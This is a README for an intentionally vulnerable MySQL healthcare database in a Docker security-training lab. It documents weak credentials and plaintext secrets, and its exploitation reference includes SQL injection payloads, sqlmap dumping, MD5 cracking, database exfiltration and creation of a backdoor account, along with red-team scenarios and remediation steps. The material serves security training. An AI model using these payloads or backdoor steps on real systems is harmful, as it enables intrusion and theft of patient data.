# MySQL Healthcare Database - Security Testing Environment

## ⚠️ CRITICAL WARNING

This MySQL database contains **INTENTIONAL SECURITY VULNERABILITIES** designed for educational purposes and security testing. 

**DO NOT:**
- Deploy to production environments
- Use with real patient data
- Expose to the internet
- Use these security configurations in any real application

**This environment is for:**
- Security training and education
- Red team / penetration testing practice
- Blue team detection and response exercises
- Security awareness demonstrations

---

## Quick Start

### Starting the Database

```bash
# Navigate to docker-lab directory
cd docker-lab

# Start all services (including database)
docker-compose up -d ehr-database

# Or start entire lab
docker-compose up -d

# Verify database is running
docker ps | grep medusa_ehr_db
```

### Connecting to the Database

```bash
# Connect as root user (weak password: admin123)
mysql -h localhost -P 3306 -u root -padmin123

# Connect as application user
mysql -h localhost -P 3306 -u ehrapp -pWelcome123! healthcare_db

# Connect as backup user (read-only)
mysql -h localhost -P 3306 -u backup -pbackup123 healthcare_db

# Connect as reporting user
mysql -h localhost -P 3306 -u reporting -preports healthcare_db
```

### Quick Database Exploration

```sql
-- Show available databases
SHOW DATABASES;

-- Use healthcare database
USE healthcare_db;

-- Show all tables
SHOW TABLES;

-- View patient count
SELECT COUNT(*) FROM patients;

-- View sample patient data
SELECT id, first_name, last_name, dob FROM patients LIMIT 5;

-- View medical records count
SELECT COUNT(*) FROM medical_records;

-- Check for plaintext credentials (VULNERABILITY!)
SELECT COUNT(*) FROM comments WHERE plaintext_credential IS NOT NULL;
```

---

## Database Overview

### Connection Details

| Parameter | Value |
|-----------|-------|
| **Host** | localhost (or `ehr-database` within Docker network) |
| **Port** | 3306 (⚠️ Exposed to host) |
| **Database** | healthcare_db |
| **Root Password** | admin123 (⚠️ WEAK) |

### Database Contents

- **50 synthetic patients** with complete demographic information
- **200+ medical records** with realistic clinical data
- **100+ appointments** (scheduled, completed, cancelled)
- **80+ prescriptions** (active and historical)
- **50+ lab results** with clinical values
- **Multiple database users** with varying privileges
- **Plaintext credentials** in comments table (CRITICAL vulnerability)

### Database Schema

```
healthcare_db
├── users              (System authentication)
├── patients           (Demographics + PHI)
├── medical_records    (Clinical documentation)
├── appointments       (Scheduling)
├── prescriptions      (Medications)
├── lab_results        (Lab test results)
├── audit_log          (System auditing)
├── comments           (⚠️ Contains plaintext passwords!)
└── billing            (Financial information)
```

---

## Intentional Vulnerabilities

### 🔴 CRITICAL

1. **Plaintext Credentials in Database**
   - Location: `comments` table, `plaintext_credential` column
   - Contains: FTP, LDAP, VPN, SSH, and admin passwords
   - Impact: Complete infrastructure compromise

2. **MD5 Password Hashing**
   - Location: `users` table, `password_hash` column
   - Issue: MD5 is cryptographically broken
   - Impact: Passwords crackable in seconds

3. **Unencrypted SSNs**
   - Location: `patients` table, `ssn` column
   - Issue: 50 SSNs stored in plaintext
   - Impact: Identity theft, HIPAA violation

4. **Weak Root Password**
   - Username: `root`
   - Password: `admin123`
   - Impact: Full database control

### 🟡 HIGH

5. **Overly Permissive Database User**
   - Username: `ehrapp`
   - Privileges: ALL PRIVILEGES on healthcare_db
   - Should have: Only SELECT, INSERT, UPDATE, DELETE

6. **Exposed MySQL Port**
   - Port 3306 accessible from host
   - Should be: Internal Docker network only

7. **Remote Root Access Enabled**
   - Root can connect from any host (`%`)
   - Should be: localhost only

8. **Weak User Passwords**
   - `backup / backup123`
   - `reporting / reports`
   - `dev / dev`

### 🟢 MEDIUM

9. **Insufficient Audit Logging**
   - No automatic logging via triggers
   - Application must manually log (easily bypassed)

10. **No Encryption at Rest**
    - MySQL data files unencrypted
    - Accessible if container compromised

---

## Database Users and Credentials

### Administrative Users

| Username | Password | Privileges | Notes |
|----------|----------|------------|-------|
| **root** | admin123 | ALL (global) | ⚠️ Remote access enabled |
| **ehrapp** | Welcome123! | ALL on healthcare_db | ⚠️ Overly permissive |

### Standard Users

| Username | Password | Privileges | Use Case |
|----------|----------|------------|----------|
| **backup** | backup123 | SELECT, LOCK TABLES | Backup operations |
| **reporting** | reports | SELECT only | Read-only reporting |
| **dev** | dev | ALL on healthcare_db | ⚠️ Should not exist in prod |

### Application Users (in database)

Query `users` table for application-level accounts:

```sql
SELECT username, password_hash, role FROM users;
```

**Password hashes (MD5):**
- `admin / password` → `5f4dcc3b5aa765d61d8327deb882cf99`
- `doctor1 / 123456` → `e10adc3949ba59abbe56e057f20f883e`
- `sysadmin / admin` → `21232f297a57a5a743894a0e4a801fc3`

---

## Exploitation Quick Reference

### 1. Credential Access

```bash
# Test weak credentials
mysql -h localhost -P 3306 -u root -padmin123

# Extract password hashes
mysql -u reporting -preports healthcare_db -e "SELECT username, password_hash FROM users;"

# Crack MD5 hashes
hashcat -m 0 -a 0 hashes.txt rockyou.txt
```

### 2. Plaintext Credential Harvesting

```sql
-- Extract plaintext passwords from database
USE healthcare_db;
SELECT id, comment_text, plaintext_credential 
FROM comments 
WHERE plaintext_credential IS NOT NULL;

-- Reveals:
-- - FTP credentials
-- - LDAP admin password
-- - VPN credentials  
-- - SSH root password
-- - And more...
```

### 3. PHI Data Exfiltration

```bash
# Dump entire database
mysqldump -h localhost -P 3306 -u backup -pbackup123 \
  healthcare_db > stolen_database.sql

# Extract SSNs only
mysql -u backup -pbackup123 -N -B healthcare_db <<EOF
SELECT first_name, last_name, ssn, dob FROM patients;
EOF > stolen_ssn.csv
```

### 4. Privilege Escalation

```sql
-- Connect as low-privilege user
mysql -u reporting -preports healthcare_db

-- Find admin credentials
SELECT plaintext_credential FROM comments 
WHERE plaintext_credential LIKE '%admin%';

-- Disconnect and reconnect with elevated privileges
-- Then create backdoor:
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'secret';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';
```

### 5. SQL Injection (via vulnerable web app)

```bash
# Test for SQL injection
curl "http://localhost:8080/patient.php?id=1' OR '1'='1"

# Extract user hashes
curl "http://localhost:8080/patient.php?id=1' UNION SELECT username,password_hash FROM users--"

# Or use sqlmap
sqlmap -u "http://localhost:8080/patient.php?id=1" --dump-all
```

---

## MITRE ATT&CK Techniques

This database demonstrates **18 MITRE ATT&CK techniques**:

### Initial Access
- **T1078** - Valid Accounts (weak credentials)
- **T1190** - Exploit Public-Facing Application (SQL injection)

### Credential Access
- **T1110.001** - Brute Force: Password Guessing
- **T1110.002** - Brute Force: Password Cracking (MD5)
- **T1552.001** - Unsecured Credentials: Files (plaintext passwords)

### Privilege Escalation
- **T1068** - Exploitation for Privilege Escalation
- **T1078.003** - Valid Accounts: Local Accounts

### Collection & Exfiltration
- **T1213** - Data from Information Repositories
- **T1048** - Exfiltration Over Alternative Protocol
- **T1567** - Exfiltration Over Web Service

### Impact
- **T1485** - Data Destruction
- **T1486** - Data Encrypted for Impact (Ransomware)
- **T1491** - Defacement
- **T1565** - Data Manipulation

**See full mapping:** [DATABASE_MITRE_ATTACK_MAPPING.md](docs/security/DATABASE_MITRE_ATTACK_MAPPING.md)

---

## Documentation

### Complete Documentation Set

1. **[DATABASE_SECURITY_DOCUMENTATION.md](docs/security/DATABASE_SECURITY_DOCUMENTATION.md)**
   - Complete vulnerability analysis
   - Database users and privileges
   - Attack surface analysis
   - Defensive recommendations
   - Remediation guide

2. **[DATABASE_EXPLOITATION_EXAMPLES.md](docs/security/DATABASE_EXPLOITATION_EXAMPLES.md)**
   - Step-by-step exploitation techniques
   - Attack scenarios and simulations
   - Automated exploitation scripts
   - Python tools for testing

3. **[DATABASE_MITRE_ATTACK_MAPPING.md](docs/security/DATABASE_MITRE_ATTACK_MAPPING.md)**
   - Comprehensive MITRE ATT&CK mapping
   - Detection strategies
   - Defensive recommendations by tactic
   - Compliance mapping (HIPAA, PCI-DSS)

---

## Training Scenarios

### Scenario 1: External Attacker (Beginner)

**Objective:** Gain initial access and extract patient data

**Steps:**
1. Port scan to identify MySQL
2. Attempt common credentials
3. Enumerate database structure
4. Extract 10 patient SSNs
5. Document findings

**Success Criteria:**
- Successful authentication
- Database enumeration
- Extraction of at least 10 SSNs

---

### Scenario 2: Insider Threat (Intermediate)

**Objective:** Low-privilege user escalates and exfiltrates all data

**Steps:**
1. Start with `reporting` user credentials
2. Discover plaintext credentials in database
3. Escalate to admin access
4. Exfiltrate complete database
5. Create persistence mechanism
6. Cover tracks

**Success Criteria:**
- Privilege escalation achieved
- Complete database dump
- Backdoor account created
- Minimal audit log footprint

---

### Scenario 3: Ransomware Attack (Advanced)

**Objective:** Simulate ransomware attack on healthcare database

**Steps:**
1. Gain access via any method
2. Backup all data (attacker keeps copy)
3. "Encrypt" data (rename tables)
4. Leave ransom note
5. Test recovery procedures

**Success Criteria:**
- Hospital operations disrupted
- Data "encrypted" and inaccessible
- Blue team must restore from backups
- Document recovery time

---

### Scenario 4: Blue Team Detection (Defensive)

**Objective:** Detect and respond to database attack

**Steps:**
1. Monitor audit logs for suspicious activity
2. Detect brute force attempts
3. Alert on plaintext credential access
4. Identify bulk data exports
5. Respond to incident

**Success Criteria:**
- Detection within 5 minutes
- Accurate incident categorization
- Appropriate containment actions
- Complete incident documentation

---

## Data Summary

### Patients Table (50 records)

```sql
-- Sample queries
SELECT COUNT(*) FROM patients;                    -- 50 patients
SELECT COUNT(*) FROM patients WHERE ssn IS NOT NULL;  -- 50 SSNs
SELECT DISTINCT insurance_provider FROM patients;  -- Multiple insurers
SELECT DISTINCT blood_type FROM patients;         -- All blood types
```

### Medical Records Table (200+ records)

```sql
SELECT COUNT(*) FROM medical_records;             -- 200+ records
SELECT COUNT(DISTINCT patient_id) FROM medical_records;  -- ~50 patients
SELECT COUNT(*) FROM medical_records 
WHERE diagnosis IS NOT NULL;                      -- All have diagnoses
```

### Appointments Table (100+ records)

```sql
SELECT COUNT(*) FROM appointments;                -- 100+ appointments
SELECT status, COUNT(*) FROM appointments GROUP BY status;
-- scheduled, completed, cancelled, no-show
```

### Vulnerable Comments Table

```sql
-- CRITICAL: Contains plaintext passwords
SELECT COUNT(*) FROM comments 
WHERE plaintext_credential IS NOT NULL;           -- ~9 credentials

-- Extract all plaintext credentials
SELECT plaintext_credential FROM comments 
WHERE plaintext_credential IS NOT NULL;
```

---

## Testing Checklist

Use this checklist to verify vulnerabilities:

### Weak Authentication
- [ ] Root user accessible with `admin123`
- [ ] Application user `ehrapp` works with `Welcome123!`
- [ ] Backup user `backup` works with `backup123`
- [ ] No account lockout after failed attempts

### Weak Cryptography
- [ ] Password hashes are MD5 (32 characters)
- [ ] MD5 hashes crack within seconds
- [ ] No salt used in password hashing

### Data Exposure
- [ ] SSNs visible in plaintext in `patients` table
- [ ] Plaintext credentials in `comments` table
- [ ] Medical diagnoses unencrypted
- [ ] No column-level encryption

### Access Control
- [ ] `ehrapp` has ALL PRIVILEGES (should be restricted)
- [ ] Root accessible remotely (should be localhost only)
- [ ] Port 3306 exposed to host network
- [ ] `dev` user exists (should be removed)

### Auditing
- [ ] Audit logging is minimal
- [ ] Logs can be deleted by attackers
- [ ] No automatic trigger-based logging
- [ ] No data change tracking

---

## Remediation Guide

For production systems, implement these fixes:

### 1. Password Security
```sql
-- Replace MD5 with bcrypt/Argon2
-- PHP example:
$hash = password_hash($password, PASSWORD_ARGON2ID);
```

### 2. Access Control
```sql
-- Revoke excessive privileges
REVOKE ALL PRIVILEGES ON healthcare_db.* FROM 'ehrapp'@'%';

-- Grant only necessary privileges
GRANT SELECT, INSERT, UPDATE ON healthcare_db.patients TO 'ehrapp'@'host';
```

### 3. Encryption
```sql
-- Encrypt sensitive columns
ALTER TABLE patients MODIFY COLUMN ssn VARBINARY(255);

-- Use MySQL encryption functions
INSERT INTO patients (ssn) VALUES (AES_ENCRYPT('123-45-6789', @key));
```

### 4. Network Security
```yaml
# Restrict database port (docker-compose.yml)
ports:
  - "127.0.0.1:3306:3306"  # Localhost only
```

### 5. Remove Plaintext Credentials
```sql
-- Delete plaintext passwords
DELETE FROM comments WHERE plaintext_credential IS NOT NULL;

-- Use secrets management (Vault, AWS Secrets Manager)
```

---

## Performance Notes

The database is optimized for **laptop/desktop use**:

```yaml
# docker-compose.yml resource limits
resources:
  limits:
    cpus: '1.0'
    memory: 1G
```

**Hardware Requirements:**
- CPU: 1 core minimum (2+ recommended)
- RAM: 1 GB for database container
- Disk: 2 GB for database + logs
- OS: Linux, macOS, or Windows with Docker Desktop

---

## Troubleshooting

### Database Won't Start

```bash
# Check container logs
docker logs medusa_ehr_db

# Check if port 3306 is already in use
lsof -i :3306
netstat -an | grep 3306

# Remove and recreate
docker-compose down -v
docker-compose up -d ehr-database
```

### Can't Connect to Database

```bash
# Verify container is running
docker ps | grep medusa_ehr_db

# Check if port is exposed
docker port medusa_ehr_db

# Test connection
telnet localhost 3306

# Check firewall rules
# Linux:
sudo iptables -L | grep 3306

# macOS:
sudo pfctl -sr | grep 3306
```

### Initialization Scripts Not Running

```bash
# Scripts run only on first start
# To re-initialize, remove volume:
docker-compose down -v
docker volume rm docker-lab_db-data
docker-compose up -d ehr-database

# Check initialization logs
docker logs medusa_ehr_db 2>&1 | grep -i "entrypoint"
```

### Database Performance Issues

```sql
-- Check database size
SELECT 
    table_schema as 'Database',
    SUM(data_length + index_length) / 1024 / 1024 as 'Size (MB)'
FROM information_schema.TABLES
WHERE table_schema = 'healthcare_db';

-- Check slow queries
SELECT * FROM mysql.slow_log ORDER BY query_time DESC LIMIT 10;
```

---

## Security Notes

### Disclaimer

This database is **INTENTIONALLY VULNERABLE** for educational purposes.

**Legal Considerations:**
- Use only in authorized testing environments
- Do not deploy with real patient data
- Ensure proper network isolation
- Comply with HIPAA, GDPR, and local regulations
- Obtain proper authorization before testing

### Data Privacy

All patient data is **completely synthetic**:
- Generated names (not real people)
- Fictional SSNs (not real Social Security Numbers)
- Synthetic medical records
- No real PHI (Protected Health Information)

**However, treat this data as if it were real:**
- Practice proper data handling
- Secure deletion after testing
- No unauthorized sharing

### Ethical Use

This lab is designed for:
✅ Security education and training  
✅ Authorized penetration testing  
✅ Red team / blue team exercises  
✅ Security awareness demonstrations  
✅ Vulnerability research  

Not for:
❌ Unauthorized access attempts  
❌ Malicious purposes  
❌ Production deployments  
❌ Real patient data  

---

## Additional Resources

### Related Documentation
- [Docker Lab README](README.md) - Main lab documentation
- [Vulnerability Documentation](docs/security/VULNERABILITY_DOCUMENTATION.md) - All services
- [MITRE ATT&CK Mapping](docs/security/MITRE_ATTACK_MAPPING.md) - Full lab coverage

### External Resources
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [HIPAA Security Rule](https://www.hhs.gov/hipaa/for-professionals/security/index.html)
- [PCI-DSS Requirements](https://www.pcisecuritystandards.org/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [MySQL Security Best Practices](https://dev.mysql.com/doc/refman/8.0/en/security-guidelines.html)

### Training Resources
- [sqlmap Tutorial](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- [Hashcat Wiki](https://hashcat.net/wiki/)
- [MySQL Security Checklist](https://dev.mysql.com/doc/refman/8.0/en/security-guidelines.html)

---

## Contributing

Found additional vulnerabilities or have suggestions?

1. Document the finding
2. Create an issue or pull request
3. Include:
   - Vulnerability description
   - Exploitation steps
   - MITRE ATT&CK mapping
   - Suggested detection/mitigation

---

## License

This project is for **educational purposes only**.

**Usage Terms:**
- Free to use for education and training
- Must not be used for malicious purposes
- Must not contain real patient data
- Users are responsible for their own testing
- No warranty provided

---

## Summary

This MySQL database provides a comprehensive security testing environment featuring:

✅ **50 synthetic patients** with complete medical records  
✅ **200+ medical records** with realistic clinical data  
✅ **18 MITRE ATT&CK techniques** demonstrated  
✅ **Multiple attack vectors** (weak passwords, SQL injection, privilege escalation)  
✅ **Plaintext credentials** for lateral movement practice  
✅ **Complete documentation** (security, exploitation, MITRE mapping)  
✅ **Training scenarios** (beginner to advanced)  
✅ **Laptop-friendly** resource requirements  

**Perfect for:**
- Red team training and practice
- Blue team detection and response
- Security awareness training
- Penetration testing skill development
- Understanding healthcare security risks

---

## Quick Command Reference

```bash
# Start database
docker-compose up -d ehr-database

# Connect as root
mysql -h localhost -P 3306 -u root -padmin123

# View all tables
mysql -u root -padmin123 healthcare_db -e "SHOW TABLES;"

# Count patients
mysql -u root -padmin123 healthcare_db -e "SELECT COUNT(*) FROM patients;"

# Extract plaintext credentials
mysql -u root -padmin123 healthcare_db -e \
  "SELECT plaintext_credential FROM comments WHERE plaintext_credential IS NOT NULL;"

# Dump database
mysqldump -u backup -pbackup123 healthcare_db > backup.sql

# Stop database
docker-compose stop ehr-database

# Remove database (including data)
docker-compose down -v
```

---

**Questions or Issues?**

Refer to the comprehensive documentation in the `docs/security/` directory or check the main [Docker Lab README](README.md).

**Happy (Ethical) Hacking! 🔐**

---

*Document Version: 1.0*  
*Last Updated: 2024-01-28*  
*Project: MEDUSA Healthcare Security Lab*

